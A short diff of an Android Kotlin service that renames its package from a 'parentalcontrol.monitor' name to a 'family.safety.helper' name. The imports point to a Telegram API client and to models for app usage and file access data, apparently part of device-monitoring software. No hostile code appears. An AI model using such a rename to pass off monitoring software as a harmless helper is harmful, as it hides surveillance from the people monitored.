@@ -1,4 +1,4 @@
-package com.parentalcontrol.monitor.services
+package com.family.safety.helper.services
 
 import android.app.Service
 import android.content.Context
@@ -7,11 +7,11 @@ import android.content.SharedPreferences
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.IBinder
-import com.parentalcontrol.monitor.api.TelegramApi
-import com.parentalcontrol.monitor.database.MonitoringDatabase
-import com.parentalcontrol.monitor.models.AppUsageData
-import com.parentalcontrol.monitor.models.FileAccessData
-import com.parentalcontrol.monitor.models.TelegramMessage
+import com.family.safety.helper.api.TelegramApi
+import com.family.safety.helper.database.MonitoringDatabase
+import com.family.safety.helper.models.AppUsageData
+import com.family.safety.helper.models.FileAccessData
+import com.family.safety.helper.models.TelegramMessage
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
